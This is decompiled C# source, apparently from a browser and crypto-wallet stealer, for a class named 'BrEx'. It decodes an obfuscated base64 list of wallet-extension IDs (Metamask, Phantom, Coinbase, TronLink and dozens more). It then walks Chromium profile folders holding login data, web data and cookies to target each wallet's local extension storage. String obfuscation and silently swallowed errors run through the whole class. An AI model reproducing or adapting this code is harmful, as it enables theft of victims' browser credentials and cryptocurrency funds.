using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

// Token: 0x02000015 RID: 21
public class BrEx : Extractor
{
	// Token: 0x0600008F RID: 143 RVA: 0x0000702C File Offset: 0x0000542C
	public void Init(IList<string> browserPaths)
	{
		this.Locals = new List<string>(browserPaths ?? new List<string>());
		char[] array = "ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbgpiZm5hZWxtb21laW1obHBtZ2puam9waGhwa2tvbGpwYXxQaGFudG9tCmZoaWxhaGVpbWdsaWduZGRramdvZmtjYmdla2hlbmJofE94eWdlbgptZ2Zma2ZiaWRpaGpwb2FvbWFqbGJnY2hkZGxpY2dwbnxQYWxpV2FsbGV0CmFvZGtrYWduYWRjYm9iZnBnZ2ZuamVvbmdlbWpiamNhfEJvbHRYCmtwZm9wa2VsbWFwY29pcGVtZmVuZG1kY2dobmVnaW1ufExpcXVhbGl0eVdhbGxldApobWVvYm5mbmZjbWRrZGNtbGJsZ2FnbWZwZmJvaWVhZnxYZGVmaVdhbGxldApscGZjYmprbmlqcGVlaWxsaWZua2lrZ25jaWtnZmhkb3xOYW1pV2FsbGV0CmRuZ21sYmxjb2Rmb2JwZHBlY2FhZGdmYmNnZ2ZqZm5tfE1haWFyRGVGaVdhbGxldApmZm5iZWxmZG9laW9oZW5ramlibm1hZGppZWhqaGFqYnxZb3JvaVdhbGxldAppYm5lamRmam1ta3BjbmxwZWJrbG1ua29lb2lob2ZlY3xUcm9ubGluawpqYmRhb2NuZWlpaW5tamJqbGdhbGhjZWxnYmVqbW5pZHxOaWZ0eVdhbGxldApua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubnxNZXRhbWFzawphZmJjYmpwYnBmYWRsa21obWNsaGtlZW9kbWFtY2ZsY3xNYXRoV2FsbGV0CmhuZmFua25vY2Zlb2ZiZGRnY2lqbm1obmZua2RuYWFkfENvaW5iYXNlCmZoYm9oaW1hZWxib2hwamJibGRjbmdjbmFwbmRvZGpwfEJpbmFuY2VDaGFpbgpvZGJmcGVlaWhka2JpaG1vcGtiam1vb25mYW5sYmZjbHxCcmF2ZVdhbGxldApocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbnxHdWFyZGFXYWxsZXQKYmxuaWVpaWZmYm9pbGxrbmpuZXBvZ2poa2dub2FwYWN8RXF1YWxXYWxsZXQKY2plbGZwbHBsZWJkamplbmxscGpjYmxtamtmY2ZmbmV8SmF4eHhMaWJlcnR5CmZpaGtha2ZvYmtta2pvanBjaHBmZ2NtaGZqbm1uZnBpfEJpdEFwcFdhbGxldAprbmNjaGRpZ29iZ2hlbmJiYWRkb2pqbm5hb2dmcHBmanxpV2FsbGV0CmFta21qam1tZmxkZG9nbWhwamxvaW1pcGJvZm5mamlofFdvbWJhdApmaGlsYWhlaW1nbGlnbmRka2pnb2ZrY2JnZWtoZW5iaHxBdG9taWNXYWxsZXQKbmxibW5uaWpjbmxlZ2tqanBjZmpjbG1jZmdnZmVmZG18TWV3Q3gKbmFuam1ka25oa2luaWZua2dkY2dnY2ZuaGRhYW1tbWp8R3VpbGRXYWxsZXQKbmtkZGduY2RqZ2pmY2RkYW1mZ2NtZm5saGNjbmltaWd8U2F0dXJuV2FsbGV0CmZuamhta2hobWtiamtrYWJuZGNubm9nYWdvZ2JuZWVjfFJvbmluV2FsbGV0CmFpaWZibmJmb2JwbWVla2lwaGVlaWppbWRwbmxwZ3BwfFRlcnJhU3RhdGlvbgpmbm5lZ3BobG9iamRwa2hlY2Fwa2lqamRrZ2NqaGtpYnxIYXJtb255V2FsbGV0CmFlYWNoa25tZWZwaGVwY2Npb25ib29oY2tvbm9lZW1nfENvaW45OFdhbGxldApjZ2Vlb2RwZmFnamNlZWZpZWZsbWRmcGhwbGtlbmxma3xUb25DcnlzdGFsCnBkYWRqa2ZrZ2NhZmdiY2VpbWNwYmthbG5mbmVwYm5rfEthcmRpYUNoYWluCmJmbmFlbG1vbWVpbWhscG1nam5qb3BoaHBra29sanBhfFBoYW50b20KZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8T3h5Z2VuCm1nZmZrZmJpZGloanBvYW9tYWpsYmdjaGRkbGljZ3BufFBhbGlXYWxsZXQKYW9ka2thZ25hZGNib2JmcGdnZm5qZW9uZ2VtamJqY2F8Qm9sdFgKa3Bmb3BrZWxtYXBjb2lwZW1mZW5kbWRjZ2huZWdpbW58TGlxdWFsaXR5V2FsbGV0CmhtZW9ibmZuZmNtZGtkY21sYmxnYWdtZnBmYm9pZWFmfFhkZWZpV2FsbGV0CmxwZmNiamtuaWpwZWVpbGxpZm5raWtnbmNpa2dmaGRvfE5hbWlXYWxsZXQKZG5nbWxibGNvZGZvYnBkcGVjYWFkZ2ZiY2dnZmpmbm18TWFpYXJEZUZpV2FsbGV0CmJoZ2hvYW1hcGNkcGJvaHBoaWdvb29hZGRpbnBrYmFpfEF1dGhlbnRpY2F0b3IKb29ramxia2lpamluaHBtbmpmZmNvZmpvbmJmYmdhb2N8VGVtcGxlV2FsbGV0".ToCharArray();
		this.PathsCollection = from x in Encoding.UTF8.GetString(Convert.FromBase64CharArray(array, 0, array.Length)).Split(new string[]
		{
			"\n",
			Environment.NewLine
		}, StringSplitOptions.RemoveEmptyEntries)
		select new KeyValuePair<string, string>(x.Split(new char[]
		{
			'|'
		})[0], x.Split(new char[]
		{
			'|'
		})[1]);
	}

	// Token: 0x06000091 RID: 145 RVA: 0x000070C0 File Offset: 0x000054C0
	public override string Id2(Entity_FileSearchInformation scannerArg, FileInfo filePath)
	{
		return scannerArg.Id5;
	}

	// Token: 0x06000092 RID: 146 RVA: 0x000070D8 File Offset: 0x000054D8
	public override IEnumerable<Entity_FileSearchInformation> Id3()
	{
		List<Entity_FileSearchInformation> list = new List<Entity_FileSearchInformation>();
		try
		{
			List<string> list2 = new List<string>();
			foreach (string baseDirectory in from x in this.Locals
			select Environment.ExpandEnvironmentVariables(x))
			{
				List<string> list3 = FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					new string(new char[]
					{
						'L',
						'o',
						'g',
						'i',
						'n',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
					new string(new char[]
					{
						'W',
						'e',
						'b',
						' ',
						'D',
						'a',
						't',
						'a'
					}),
					new string(new char[]
					{
						'C',
						'o',
						'o',
						'k',
						'i',
						'e',
						's'
					})
				});
				foreach (string text in list3)
				{
					try
					{
						string text2 = string.Empty;
						string text3 = string.Empty;
						text2 = new FileInfo(text).Directory.FullName;
						bool flag = text2.Contains(new string(new char[]
						{
							'O',
							'p',
							'e',
							'r',
							'a',
							' ',
							'G',
							'X',
							' ',
							'S',
							't',
							'a',
							'b',
							'l',
							'e'
						}));
						if (flag)
						{
							text3 = new string(new char[]
							{
								'O',
								'p',
								'e',
								'r',
								'a',
								' ',
								'G',
								'X'
							});
						}
						else
						{
							text3 = (text.Contains(new string(new char[]
							{
								'A',
								'p',
								'p',
								'D',
								'a',
								't',
								'a',
								'\\',
								'R',
								'o',
								'a',
								'm',
								'i',
								'n',
								'g',
								'\\'
							})) ? FileCopier.ChromeGetRoamingName(text2) : FileCopier.ChromeGetLocalName(text2));
						}
						bool flag2 = !string.IsNullOrEmpty(text3);
						if (flag2)
						{
							text3 = text3[0].ToString().ToUpper() + text3.Remove(0, 1);
							string text4 = FileCopier.ChromeGetName(text2);
							bool flag3 = !string.IsNullOrEmpty(text4);
							if (flag3)
							{
								foreach (KeyValuePair<string, string> keyValuePair in this.PathsCollection)
								{
									list.Add(new Entity_FileSearchInformation
									{
										Id2 = new string(new char[]
										{
											'*'
										}),
										Id5 = string.Concat(new string[]
										{
											text3,
											"_",
											text4,
											"_",
											keyValuePair.Value
										}),
										Id3 = false,
										Id1 = Path.Combine(text2, new string(new char[]
										{
											'L',
											'o',
											'c',
											'a',
											'l',
											' ',
											'E',
											'x',
											't',
											'e',
											'n',
											's',
											'i',
											'o',
											'n',
											' ',
											'S',
											'e',
											't',
											't',
											'i',
											'n',
											'g',
											's'
										}), keyValuePair.Key)
									});
								}
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x0400000A RID: 10
	private List<string> Locals;

	// Token: 0x0400000B RID: 11
	private IEnumerable<KeyValuePair<string, string>> PathsCollection;
}
